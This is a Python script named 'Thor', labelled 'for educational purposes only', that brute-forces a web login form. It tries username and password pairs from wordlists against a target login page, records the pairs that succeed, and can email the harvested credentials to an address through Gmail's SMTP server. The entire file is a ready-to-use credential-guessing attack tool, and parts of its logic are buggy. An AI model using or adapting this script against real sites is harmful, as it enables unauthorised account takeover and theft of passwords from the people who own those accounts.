#!/usr/bin/python
# -*- coding: utf-8 -*-
#======================================================
#THIS SCRIPT IS WRITTEN BY BOCIAN67 AND IS JUST FOR
#EDUCATIONAL PURPOSES ONLY!     ~Thor_will_win~
#======================================================
from requests import session
import os
from pathlib import Path
import optparse
import Thor_Mail
User = []
Pass = []

def appendtarget(tfile, tlist):
    try:
        files = open(tfile, 'r')
        for line in files.readlines():
            line = line.strip('\n')
            tlist.append(line)
    except:
        pass

def login(username,password,taruser,tarlog,with_mail):
        payload = {
            "action" : "login",
            "username" : username,
            "password" : password
        }
        with session() as c:
            c.post(tarlog, data=payload)
            response = c.get(taruser)
            content_length = response.headers["content-length"]
            status = response.status_code
            print("URL: "   +response.url+"\nUser: "+username+\
            "\nPass: "+password+"\n"+str(status))
            if (response.url == taruser):
                print "[+] Found Username: "+username+\
                "\n    with Password: "+password
                if(with_mail == True):
                    content = (username, password)
                    return content

            else:
                print ("[-] Username or Password is wrong!")

def send_mail(credentials, email, passkey):
    message = 'I found these Username(s) and Password(s):'
    for key in credentials.keys():
        message += "\n"+key+':'+credentials.get(key)
    message += "\n\n~Thor"
    subject = 'Thor is finished'
    smtp_server='smtp.gmail.com:587'
    try:
        Thor_Mail.sending(email,subject,message,passkey,smtp_server)
    except:
        print('[!] Could not send the E-Mail, but Thor is finished')
        print('[+]'+message)

def main():
    userf = []
    passf = []
    credentials = {}
    with_mail = False
    parser = optparse.OptionParser('Thor for education: '\
    +'--TL <Target Login Page> --TU <Target User Page \
    --UF <Username File> --U <Username> --PF <Passfile> --P <Password> \
    --Email <email address> --Epass <Email Password>')
    parser.add_option('--TL',dest='tarlog',type='string',\
    help='Target Login Page angeben')
    parser.add_option('--TU',dest='taruser',type='string',\
    help='Target User Page angeben')
    parser.add_option('--UF',dest='userf',type='string',\
    help='Username File angeben')
    parser.add_option('--U',dest='usern',type='string',\
    help='Username angeben')
    parser.add_option('--PF',dest='passf',type='string',\
    help='Passfile angeben')
    parser.add_option('--P',dest='passwd',type='string',\
    help='Password angeben')
    parser.add_option('--Email',dest='mail',type='string',\
    help='Email-Konto zur Benachrichtung angeben')
    parser.add_option('--Epass',dest='epass',type='string',\
    help='Das Password für das Email-Konto angeben')

    (options, args) = parser.parse_args()
    tarlog = options.tarlog
    taruser = options.taruser
    appendtarget(options.userf, userf)
    usern = options.usern
    appendtarget(options.passf, passf)
    passwd = options.passwd
    mail = options.mail
    epass = options.epass

    if ((tarlog == None) & (taruser == None)):
        print parser.usage
        exit(0)
    elif ((userf == None) & (usern == None)):
        print parser.usage
        exit(0)
    elif ((passf == None) & (passwd == None)):
        print parser.usage
        exit(0)
    if (mail != None) & (epass != None):
        with_mail = True
    else:
        with_mail = False
    try:
        if usern:
            if passwd:
                credential = login(usern, passwd,taruser,tarlog,with_mail)
                credentials.update({credential[0]:credential[1]})
            elif passf:
                for passw in passf:
                    credential = login(usern, passw,taruser,tarlog,with_mail)
                    credentials.update({credential[0]:credential[1]})
        elif userf:
            for user in userf:
                if passwd:
                    credential = login(user, passwd,taruser,tarlog,with_mail)
                    credentials.update({credential[0]:credential[1]})
                elif passf:
                    for passw in passf:
                        credential = login(user, passw,taruser,tarlog,with_mail)
                        credentials.update({credential[0]:credential[1]})
        if (credentials != None):
            send_mail(credentials, mail, epass)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
